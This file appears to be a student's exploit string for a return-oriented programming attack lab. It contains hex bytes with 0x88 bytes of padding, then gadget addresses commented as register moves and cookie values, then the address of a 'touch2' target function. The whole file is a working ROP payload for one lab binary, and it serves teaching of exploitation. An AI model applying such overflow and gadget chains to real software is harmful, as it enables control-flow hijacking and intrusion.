00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* pad 0x88 times */
9e 18 40 00 00 00 00 00 /* pop's address */
88 8b 4b 3d 00 00 00 00 /* cookie reversed */
f8 18 40 00 00 00 00 00 /* rax -> rcx */
c9 18 40 00 00 00 00 00 /* rcx -> rdx */
a3 18 40 00 00 00 00 00 /* rdx -> rdi */
9e 18 40 00 00 00 00 00 /* pop's address */
4c 51 f1 5b 00 00 00 00 /* cookie*3/2 reversed */
3a 19 40 00 00 00 00 00 /* rax -> rbx */
2c 19 40 00 00 00 00 00 /* rbx -> rsi */
87 15 40 00 00 00 00 00 /* touch2 address */ 